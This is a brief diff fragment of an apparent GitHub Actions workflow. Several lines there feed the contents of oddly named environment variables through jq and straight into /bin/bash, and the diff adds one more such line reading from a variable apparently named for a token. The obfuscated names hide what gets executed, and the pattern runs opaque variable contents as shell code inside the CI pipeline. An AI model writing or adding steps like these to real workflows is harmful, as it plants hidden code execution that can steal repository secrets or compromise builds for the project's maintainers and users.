@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$mwxc4203" | jq -r .mifab82562 | /bin/bash
           echo $rl2001 | jq -r .xxv5304 | /bin/bash
           echo $ug0 | jq -r .mrulf9 | /bin/bash
+          printf '%s' "$tkn2" | jq -r .fdsar3996 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
